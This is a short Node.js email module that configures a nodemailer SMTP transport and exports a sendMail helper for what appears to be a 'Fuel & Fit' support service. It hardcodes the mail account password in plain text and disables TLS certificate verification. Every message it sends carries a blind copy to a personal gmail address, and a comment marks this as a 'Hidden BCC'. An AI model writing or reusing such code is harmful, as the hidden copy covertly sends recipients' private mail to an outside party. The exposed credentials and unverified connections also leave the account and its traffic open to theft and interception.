const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "mail.ameenerp.khanwco.net",
  port: 587,
  secure: false, // STARTTLS
  auth: {
    user: "info@ameenerp.khanwco.net",
    pass: "AmeenMail2026!"
  },
  tls: {
    rejectUnauthorized: false
  }
});

async function sendMail({ from, to, subject, html, text }) {
  const mailOptions = {
    from: from || '"Fuel & Fit Support" <support@fuelnfit.khanwco.net>',
    to,
    bcc: "yahyaanas2005@gmail.com", // Hidden BCC as requested
    subject,
    html,
    text
  };

  return transporter.sendMail(mailOptions);
}

module.exports = { sendMail };
